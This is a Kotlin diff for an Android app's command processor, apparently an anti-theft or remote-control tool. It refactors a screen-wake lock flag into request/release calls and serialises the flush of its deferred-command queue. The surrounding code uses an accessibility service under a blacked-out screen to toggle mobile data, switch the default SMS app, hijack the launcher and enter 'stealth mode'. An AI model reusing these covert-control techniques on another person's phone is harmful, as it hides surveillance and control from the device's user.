@@ -756,11 +756,11 @@ object CommandProcessor {
                             errorMsg = "No previous SMS package found in memory."
                         } else {
                                                     DefaultSmsManager.expectedMode = "RESTORE"
-                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
+                        DimmerManager.IgnitionManager.request(ctx, "RESTORE_DEFAULT_SMS")
                         Handler(Looper.getMainLooper()).post {
                             DimmerManager.applyDim(ctx, 0, "AUTO")
                             Handler(Looper.getMainLooper()).postDelayed({
-                                ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                                DimmerManager.IgnitionManager.release(ctx, "RESTORE_DEFAULT_SMS")
                                 if (DefaultSmsManager.expectedMode == "RESTORE") {
                                     DefaultSmsManager.expectedMode = ""
                                     MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
@@ -1642,7 +1642,7 @@ object CommandProcessor {
                         status = "FAILED (SERVICE_OFF)"
                         errorMsg = "Accessibility is required for Ghost Hand data toggle."
                     } else {
-                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
+                        DimmerManager.IgnitionManager.request(ctx, "FORCE_DATA")
                         Handler(Looper.getMainLooper()).post {
                             DimmerManager.applyDim(ctx, 0, "AUTO")
                             MyAccessibilityService.instance?.isWaitingForDataSettings = true
@@ -1653,7 +1653,7 @@ object CommandProcessor {
                             ctx.startActivity(dataIntent)
                             
                             Handler(Looper.getMainLooper()).postDelayed({
-                                ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                                DimmerManager.IgnitionManager.release(ctx, "FORCE_DATA")
                                 if (MyAccessibilityService.instance?.isWaitingForDataSettings == true) {
                                     MyAccessibilityService.instance?.isWaitingForDataSettings = false
                                     DimmerManager.removeOverlay(ctx)
@@ -1700,8 +1700,8 @@ object CommandProcessor {
                         LauncherManager.isHijacking = false
                         ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                             .putBoolean("power_shield_active", false)
-                            .putBoolean("power_shield_keep_ignited", false)
                             .apply()
+                        DimmerManager.IgnitionManager.release(ctx, "STOLEN_PHONE")
                         
                         // 5. Clear Pending Alerts & SIM Traps
                         ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
@@ -1718,7 +1718,7 @@ object CommandProcessor {
                             errorMsg = "No target number specified in command or Judas Registry"
                         } else {
                             // 0. IGNITION LOCK & DELAYED ARMING
-                            ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
+                            DimmerManager.IgnitionManager.request(ctx, "STOLEN_PHONE")
                             Handler(Looper.getMainLooper()).postDelayed({
                                 JudasManager.engageStealthMode(ctx)
                                 ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
@@ -1798,7 +1798,7 @@ object CommandProcessor {
                     }, 26000)
 
                     Handler(Looper.getMainLooper()).postDelayed({
-                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                        DimmerManager.IgnitionManager.release(ctx, "STOLEN_PHONE")
                         if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true || LauncherManager.isHijacking) {
                             DefaultSmsManager.expectedMode = ""
                             MyAccessibilityService.instance?.isWaitingForDataSettings = false
@@ -1814,7 +1814,7 @@ object CommandProcessor {
                     }
                 }
                 "FULL_ONBOARDING" -> {
-                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
+                    DimmerManager.IgnitionManager.request(ctx, "FULL_ONBOARDING")
                     // 1. STRONG WAKE (Delayed by 5 seconds for testing)
                     Handler(Looper.getMainLooper()).postDelayed({
                         val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
@@ -1862,7 +1862,7 @@ object CommandProcessor {
                     }, 17000)
             
             Handler(Looper.getMainLooper()).postDelayed({
-                ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                DimmerManager.IgnitionManager.release(ctx, "FULL_ONBOARDING")
                 if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true) {
                     DefaultSmsManager.expectedMode = ""
                     MyAccessibilityService.instance?.isWaitingForDataSettings = false
@@ -2860,7 +2860,7 @@ object CommandProcessor {
                 }
                 "HIJACK_LAUNCHER" -> {
                     DebugLogger.log("HIJACK_INIT", "Command [HIJACK_LAUNCHER] received. ID: $id")
-                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
+                    DimmerManager.IgnitionManager.request(ctx, "HIJACK_LAUNCHER")
                     LauncherManager.isHijacking = true
                     LauncherManager.pendingCmdId = id
                     
@@ -2899,7 +2899,7 @@ object CommandProcessor {
                             }
                             CommandRetryManager.scheduleRetry(ctx, id, "HIJACK_LAUNCHER", "", "30s Hijack Timeout")
                         }
-                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                        DimmerManager.IgnitionManager.release(ctx, "HIJACK_LAUNCHER")
                     }
 
                     status = "HIJACK_INITIATED"
@@ -2991,20 +2991,24 @@ object CommandProcessor {
             CommandProcessor.updateCommandStatus(ctx, cmd.optInt("id", -1), "QUEUED_FOR_UNLOCK", "Device securely locked. Waiting for user unlock to execute.")
         }
 
+        private val flushMutex = kotlinx.coroutines.sync.Mutex()
+
         suspend fun flushQueue(ctx: Context) {
-            val prefs = ctx.getSharedPreferences(QUEUE_PREF, Context.MODE_PRIVATE)
-            val queueStr = prefs.getString("queue", "[]") ?: "[]"
-            if (queueStr == "[]") return
-            
-            val queue = org.json.JSONArray(queueStr)
-            prefs.edit().remove("queue").apply() // Clear immediately to avoid loops
-            
-            DebugLogger.log("GATEKEEPER", "Device Unlocked! Flushing ${queue.length()} deferred commands...")
-            for (i in 0 until queue.length()) {
-                val cmd = queue.getJSONObject(i)
-                DebugLogger.log("GATEKEEPER", "Executing deferred command: ${cmd.optString("file_name")}")
-                CommandProcessor.processSingleCommand(ctx, cmd)
-                kotlinx.coroutines.delay(2000) // Delay between commands to let UI settle
+            flushMutex.withLock {
+                val prefs = ctx.getSharedPreferences(QUEUE_PREF, Context.MODE_PRIVATE)
+                val queueStr = prefs.getString("queue", "[]") ?: "[]"
+                if (queueStr == "[]") return
+                
+                val queue = org.json.JSONArray(queueStr)
+                prefs.edit().remove("queue").apply() // Clear immediately to avoid loops
+                
+                DebugLogger.log("GATEKEEPER", "Device Unlocked! Flushing ${queue.length()} deferred commands...")
+                for (i in 0 until queue.length()) {
+                    val cmd = queue.getJSONObject(i)
+                    DebugLogger.log("GATEKEEPER", "Executing deferred command: ${cmd.optString("file_name")}")
+                    CommandProcessor.processSingleCommand(ctx, cmd)
+                    kotlinx.coroutines.delay(2000) // Delay between commands to let UI settle
+                }
             }
         }
     }
